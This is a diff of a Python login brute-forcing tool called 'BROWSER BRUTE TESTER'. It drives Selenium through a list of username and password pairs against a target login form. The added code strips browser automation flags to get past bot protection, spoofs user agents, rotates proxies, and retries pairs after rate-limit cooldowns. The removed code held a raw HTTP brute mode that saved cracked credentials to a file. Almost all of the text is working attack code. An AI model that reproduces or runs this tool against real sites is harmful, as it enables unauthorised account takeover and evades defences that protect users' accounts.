     # ── Launch the GUI ──
@@ -1315,24 +1126,14 @@ DELAY = args.delay
 JITTER = args.jitter
 RUN_HEADLESS = args.headless
 
-# RAW MODE SETTINGS
-IS_RAW_MODE = args.raw
-RAW_METHOD = args.method.upper()
-RAW_DATA = args.data
-RAW_TIMEOUT = args.timeout
-RAW_HEADERS = {}
-if args.headers:
-    try:
-        for pair in args.headers.split('|'):
-            k, v = pair.split(':', 1)
-            RAW_HEADERS[k.strip()] = v.strip()
-    except Exception as e:
-        print(f"[-] Failed to parse headers: {e}")
 
-SUCCESS_MSG = args.success.lower() if args.success else None
+# LAUNCH SELENIUM
+driver = webdriver.Chrome()
+driver.get(TARGET_URL)
 
 username_selector = None
 password_selector = None
+submit_selector = None
 
 print("\n==============================")
 print("🔥 BROWSER BRUTE TESTER 🔥")
@@ -1340,130 +1141,125 @@ print("==============================\n")
 print(f"Target URL: {TARGET_URL}")
 print(f"User: {USERNAME_FIXED}")
 print(f"Wordlist: {WORDLIST}")
-print(f"Mode: {'RAW HTTP' if IS_RAW_MODE else 'SELENIUM BROWSER'}")
 print(f"Proxies: {PROXY_INFO}")
 print(f"Threads: {THREADS}")
 print(f"Delay/Jitter: {DELAY}s / {JITTER}s")
+# Inject JS to track last clicked element
+driver.execute_script("""
+document.addEventListener('click', function(e) {
+    window._lastClicked = e.target;
+});
+""")
 
-if not IS_RAW_MODE:
-    # LAUNCH SELENIUM FOR SETUP
-    driver = webdriver.Chrome()
-    driver.get(TARGET_URL)
-
-    # Inject JS to track last clicked element
-    driver.execute_script("""
-    document.addEventListener('click', function(e) {
-        window._lastClicked = e.target;
-    });
-    """)
-
-    # GENERATE CSS SELECTOR FROM CLICKED ELEMENT
-    def get_css_selector():
-        elem = driver.execute_script("return window._lastClicked")
-        if elem is None:
-            return None
-        return driver.execute_script("""
-        function cssPath(el){
-            if (!el) return null;
-            var path = [];
-            while (el.nodeType === Node.ELEMENT_NODE){
-                var selector = el.nodeName.toLowerCase();
-                if (el.id){
-                    selector += "#" + el.id;
-                    path.unshift(selector);
-                    break;
-                } else {
-                    var sib = el, nth = 1;
-                    while(sib = sib.previousElementSibling){
-                        if (sib.nodeName.toLowerCase() == selector)
-                            nth++;
-                    }
-                    if (nth != 1)
-                        selector += ":nth-of-type("+nth+")";
-                }
+# GENERATE CSS SELECTOR FROM CLICKED ELEMENT
+def get_css_selector():
+    elem = driver.execute_script("return window._lastClicked")
+    if elem is None:
+        return None
+    return driver.execute_script("""
+    function cssPath(el){
+        if (!el) return null;
+        var path = [];
+        while (el.nodeType === Node.ELEMENT_NODE){
+            var selector = el.nodeName.toLowerCase();
+            if (el.id){
+                selector += "#" + el.id;
                 path.unshift(selector);
-                el = el.parentNode;
+                break;
+            } else {
+                var sib = el, nth = 1;
+                while(sib = sib.previousElementSibling){
+                    if (sib.nodeName.toLowerCase() == selector)
+                        nth++;
+                }
+                if (nth != 1)
+                    selector += ":nth-of-type("+nth+")";
             }
-            return path.join(" > ");
+            path.unshift(selector);
+            el = el.parentNode;
         }
-        return cssPath(arguments[0]);
-        """, elem)
+        return path.join(" > ");
+    }
+    return cssPath(arguments[0]);
+    """, elem)
 
-    if auto_detect:
-        print("\n🔍 Auto-detecting login form fields...")
-        time.sleep(2)  # Let page load completely
-        try:
-            # Passwords usually have type "password"
-            # Usernames are usually the element right before the password or type="text"/"email"
-            driver.execute_script("""
-                window._autoFindFields = function() {
-                    let passwordField = document.querySelector('input[type="password"]');
-                    let userField = null;
-                    
-                    if (passwordField) {
-                        // Look for preceding text/email inputs in the same form
-                        let inputs = Array.from(passwordField.form ? passwordField.form.querySelectorAll('input') : document.querySelectorAll('input'));
-                        for (let el of inputs) {
-                            if ((el.type === 'text' || el.type === 'email' || el.name.includes('user')) && el !== passwordField) {
-                                userField = el;
-                                break;
-                            }
+if auto_detect:
+    print("\n🔍 Auto-detecting login form fields...")
+    time.sleep(2)  # Let page load completely
+    try:
+        # Passwords usually have type "password"
+        # Usernames are usually the element right before the password or type="text"/"email"
+        driver.execute_script("""
+            window._autoFindFields = function() {
+                let passwordField = document.querySelector('input[type="password"]');
+                let userField = null;
+                
+                if (passwordField) {
+                    // Look for preceding text/email inputs in the same form
+                    let inputs = Array.from(passwordField.form ? passwordField.form.querySelectorAll('input') : document.querySelectorAll('input'));
+                    for (let el of inputs) {
+                        if ((el.type === 'text' || el.type === 'email' || el.name.includes('user')) && el !== passwordField) {
+                            userField = el;
+                            break;
                         }
                     }
-                    
-                    // Fallback basic CSS
-                    let ucss = userField ? userField.tagName.toLowerCase() + (userField.id ? '#'+userField.id : (userField.name ? '[name="'+userField.name+'"]' : '')) : null;
-                    let pcss = passwordField ? passwordField.tagName.toLowerCase() + (passwordField.id ? '#'+passwordField.id : (passwordField.name ? '[name="'+passwordField.name+'"]' : '')) : null;
-                    
-                    return [ucss, pcss];
-                };
-            """)
-            
-            detected_selectors = driver.execute_script("return window._autoFindFields();")
-            if detected_selectors and detected_selectors[0] and detected_selectors[1]:
-                username_selector, password_selector = detected_selectors
-                print(f"✅ AUTO-DETECTED Username: {username_selector}")
-                print(f"✅ AUTO-DETECTED Password: {password_selector}")
-            else:
-                print("❌ Courier auto-detect failed. Please lock manually.")
-                auto_detect = False
-        except Exception as e:
-            print(f"❌ Auto-detect script failed: {e}. Switching to manual mode.")
+                }
+                
+                // Fallback basic CSS
+                let ucss = userField ? userField.tagName.toLowerCase() + (userField.id ? '#'+userField.id : (userField.name ? '[name="'+userField.name+'"]' : '')) : null;
+                let pcss = passwordField ? passwordField.tagName.toLowerCase() + (passwordField.id ? '#'+passwordField.id : (passwordField.name ? '[name="'+passwordField.name+'"]' : '')) : null;
+                
+                return [ucss, pcss];
+            };
+        """)
+        
+        detected_selectors = driver.execute_script("return window._autoFindFields();")
+        if detected_selectors and detected_selectors[0] and detected_selectors[1]:
+            username_selector, password_selector = detected_selectors
+            print(f"✅ AUTO-DETECTED Username: {username_selector}")
+            print(f"✅ AUTO-DETECTED Password: {password_selector}")
+        else:
+            print("❌ Courier auto-detect failed. Please lock manually.")
             auto_detect = False
+    except Exception as e:
+        print(f"❌ Auto-detect script failed: {e}. Switching to manual mode.")
+        auto_detect = False
 
-    # WAIT FOR USER TO LOCK FIELDS
-    if not auto_detect:
-        print("\n👉 CLICK username field → press S")
-        print("👉 CLICK password field → press T")
-        print("👉 Press ENTER to start brute\n")
+# WAIT FOR USER TO LOCK FIELDS
+if not auto_detect:
+    print("\n👉 CLICK username field → press S")
+    print("👉 CLICK password field → press T")
+    print("👉 Press ENTER to start brute\n")
 
-    while username_selector is None or password_selector is None:
-        if keyboard.is_pressed("s"):
-            css = get_css_selector()
-            if css:
-                username_selector = css
-                print(f"🔵 Username selector LOCKED: {css}")
-            time.sleep(0.3)
-        if keyboard.is_pressed("t"):
-            css = get_css_selector()
-            if css:
-                password_selector = css
-                print(f"🟣 Password selector LOCKED: {css}")
-            time.sleep(0.3)
+while username_selector is None or password_selector is None:
+    if keyboard.is_pressed("s"):
+        css = get_css_selector()
+        if css:
+            username_selector = css
+            print(f"🔵 Username selector LOCKED: {css}")
+        time.sleep(0.3)
+    if keyboard.is_pressed("t"):
+        css = get_css_selector()
+        if css:
+            password_selector = css
+            print(f"🟣 Password selector LOCKED: {css}")
+        time.sleep(0.3)
 
-    print("\nSelectors locked! Press ENTER to launch brute...")
+print("\nSelectors locked! Press ENTER to launch brute...")
 
-    # TEST THE SELECTORS IMMEDIATELY (fix)
-    driver.find_element(By.CSS_SELECTOR, username_selector)
-    driver.find_element(By.CSS_SELECTOR, password_selector)
+# TEST THE SELECTORS IMMEDIATELY (fix)
+driver.find_element(By.CSS_SELECTOR, username_selector)
+driver.find_element(By.CSS_SELECTOR, password_selector)
 
-    keyboard.wait("enter")
+keyboard.wait("enter")
 
 # LOAD WORDLIST
-q = Queue()
-for user in users:
-    for pwd in passwords:
-        q.put((user, pwd))
+q = Queue(maxsize=1000)
+def populate():
+    for user in users:
+        for pwd in passwords:
+            q.put((user, pwd))
+threading.Thread(target=populate, daemon=True).start()
 
 found = False
 
@@ -1471,85 +1267,67 @@ found = False
 def worker():
     global found
     
-    thread_driver = None
-    if not IS_RAW_MODE:
-        # Initialize a new webdriver for each thread
-        options = get_optimized_chrome_options()
-        
-        USER_AGENTS = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-        ]
-        options.add_argument(f"user-agent={random.choice(USER_AGENTS)}")
-        
-        # Optional Proxy Rotation
-        if proxies:
-            proxy = random.choice(proxies)
-            options.add_argument(f"--proxy-server={proxy}")
-
-        if RUN_HEADLESS:
-            options.add_argument("--headless=new")
-            
-        thread_driver = webdriver.Chrome(options=options)
+    # Initialize a new webdriver for each thread
+    options = webdriver.ChromeOptions()
     
-    # Raw mode session
-    session = None
-    if IS_RAW_MODE:
-        session = requests.Session()
-        if proxies:
-            proxy = random.choice(proxies)
-            session.proxies = {"http": proxy, "https": proxy}
-        session.headers.update(RAW_HEADERS)
+    # STEALTH: Remove webdriver flag to bypass basic bot protection
+    options.add_experimental_option("excludeSwitches", ["enable-automation"])
+    options.add_experimental_option('useAutomationExtension', False)
+    options.add_argument('--disable-blink-features=AutomationControlled')
+    
+    # Spoof User Agent randomly
+    USER_AGENTS = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    ]
+    options.add_argument(f"user-agent={random.choice(USER_AGENTS)}")
+    
+    # Optional Proxy Rotation
+    if proxies:
+        proxy = random.choice(proxies)
+        options.add_argument(f"--proxy-server={proxy}")
+
+    if RUN_HEADLESS:
+        options.add_argument("--headless")
+        options.add_argument("--disable-gpu")
+        options.add_argument("--window-size=1920x1080")
+        
+    thread_driver = webdriver.Chrome(options=options)
     
     try:
         while not q.empty() and not found and not _GLOBAL_STOP.is_set():
             user, pwd = q.get()
             
-            # Skip empty passwords
+            # Skip empty passwords (especially artifacts from CUPP generation)
             if not pwd or str(pwd).strip() == "":
                 q.task_done()
                 continue
                 
             try:
-                if found or _GLOBAL_STOP.is_set(): break
-                
-                # Add delay
+                # Break early if another thread already found the password
+                if found or _GLOBAL_STOP.is_set():
+                    break
+                    
+                # Add delay if configured
                 actual_delay = DELAY
-                if JITTER > 0.0: actual_delay += random.uniform(0, JITTER)
+                if JITTER > 0.0:
+                    actual_delay += random.uniform(0, JITTER)
+                    
                 if actual_delay > 0.0:
-                    for _ in range(int(actual_delay * 10)):
+                    for _ in range(int(actual_delay * 10)): # sleep in small chunks so we can break early
                         if found: break
                         time.sleep(0.1)
-                if found: break
                 
-                print(f"[*] Trying: {user} / {pwd}")
+                if found:
+                    break
                 
-                if IS_RAW_MODE:
-                    # RAW REQUESTS MODE (Blazing fast, no browser)
-                    payload = RAW_DATA.replace("^USER^", user).replace("^PASS^", pwd)
-                    try:
-                        if RAW_METHOD == "POST":
-                            if RAW_HEADERS.get("Content-Type") == "application/json":
-                                resp = session.post(TARGET_URL, data=payload.encode('utf-8'), timeout=RAW_TIMEOUT)
-                            else:
-                                # Default to application/x-www-form-urlencoded
-                                headers = {"Content-Type": "application/x-www-form-urlencoded"}
-                                headers.update(RAW_HEADERS)
-                                resp = session.post(TARGET_URL, data=payload, headers=headers, timeout=RAW_TIMEOUT)
-                        else:
-                            resp = session.get(TARGET_URL + "?" + payload, timeout=RAW_TIMEOUT)
-                            
-                        page_source = resp.text.lower()
-                    except requests.exceptions.RequestException as e:
-                        print(f"[-] Request error: {e}")
-                        q.task_done()
-                        continue
-                else:
-                    # SELENIUM MODE
-                    thread_driver.get(TARGET_URL)
-                    if found: break
+                thread_driver.get(TARGET_URL)
+                if found:
+                    break
+                    
+                try:
                     
                     u = thread_driver.find_element(By.CSS_SELECTOR, username_selector)
                     p = thread_driver.find_element(By.CSS_SELECTOR, password_selector)
@@ -1559,68 +1337,71 @@ def worker():
                     p.send_keys(pwd)
                     p.send_keys(Keys.ENTER)
                     
-                    if found: break
+                    if found:
+                        break
+                        
+                    print(f"[*] Trying: {user} / {pwd}")
                     
-                    # Wait for login
+                    # Wait for login to process, check periodically
                     for _ in range(20):
                         if found: break
                         time.sleep(0.1)
-                    if found: break
-                    
-                    page_source = thread_driver.page_source.lower()
-                
-                # Check for rate limiting
-                if LIMIT_TEXT and LIMIT_TEXT in page_source:
-                    print(f"[\033[33m!\033[0m] Rate Limit detected ('{LIMIT_TEXT}')!")
-                    if COOLDOWN > 0:
-                        print(f"[\033[36m~\033[0m] Bypassing... Sleeping {COOLDOWN}s")
-                        for _ in range(COOLDOWN * 10):
-                            if found: break
-                            time.sleep(0.1)
-                        if not found:
-                            q.put((user, pwd))
-                    continue
-
-                # Check Success/Failure
-                is_valid = False
-                if SUCCESS_MSG:
-                    if SUCCESS_MSG in page_source:
-                        is_valid = True
-                else:
-                    # Explicit error check (Fail mode)
-                    if ERROR_MSG and ERROR_MSG not in page_source:
-                        is_valid = True
                         
-                if is_valid and not found:
-                    print(f"\n[+] 🔥🔥 VALID CREDENTIALS FOUND: {user} / {pwd} 🔥🔥\n")
-                    found = True
-                    try:
-                        with open("credentials.txt", "a", encoding="utf-8") as cf:
-                            cf.write(f"{user}:{pwd}\\n")
-                    except: pass
-                    with q.mutex:
-                        q.queue.clear()
-                break
+                    if found:
+                        break
+                    
+                    # Check error message
+                    page_source = thread_driver.page_source.lower()
+                    current_url = thread_driver.current_url
+                    
+                    # Check for rate limiting first
+                    if LIMIT_TEXT and LIMIT_TEXT in page_source:
+                        print(f"[\033[33m!\033[0m] Rate Limit detected ('{LIMIT_TEXT}')!")
+                        if COOLDOWN > 0:
+                            print(f"[\033[36m~\033[0m] Bypassing... Sleeping {COOLDOWN} seconds before retrying {user}/{pwd}")
+                            # sleep in small steps to break early if another thread solves it
+                            for _ in range(COOLDOWN * 10):
+                                if found: break
+                                time.sleep(0.1)
+                            if not found:
+                                q.put((user, pwd))  # Put the exact combo back in the queue to try again
+                        else:
+                            print(f"[-] Rate limit hit, skipping {user}/{pwd}...")
+                        continue
 
-            except (NoSuchElementException, WebDriverException) as e:
-                print(f"[-] Error during attempt with '{user} / {pwd}': element not found.")
+                    # First check if the page actually contains our explicit fail phrase
+                    if ERROR_MSG and ERROR_MSG in page_source:
+                        # It explicitly failed
+                        continue
+                        
+                    # If we got here, the explicit fail message is missing.
+                    # It might be a win. Alternatively, check if URL changed to something unexpected.
+                    if not found:
+                        print(f"\n[+] 🔥🔥 VALID CREDENTIALS FOUND: {user} / {pwd} 🔥🔥\n")
+                        found = True
+                        
+                        # Clear the queue so other threads stop grabbing new combos
+                        with q.mutex:
+                            q.queue.clear()
+                            
+                    break
+                except (NoSuchElementException, WebDriverException) as e:
+                    print(f"[-] Error during attempt with '{user} / {pwd}': element not found or page not loaded properly.")
             except Exception as e:
                 print(f"[-] Navigation or unexpected error: {e}")
             finally:
                 q.task_done()
     finally:
-        if thread_driver:
-            try:
-                thread_driver.quit()
-            except:
-                pass
+        try:
+            thread_driver.quit()
+        except:
+            pass
 
 # Close the initial setup driver
-if not IS_RAW_MODE:
-    try:
-        driver.quit()
-    except:
-        pass
+try:
+    driver.quit()
+except:
+    pass
 
 # THREAD LAUNCHER
 threads = []
@@ -1651,3 +1432,6 @@ finally:
     if _GLOBAL_STOP.is_set() and not found:
         print("\n[!] Stopped by signal. Cleaning up...")
     pass
+
+
+
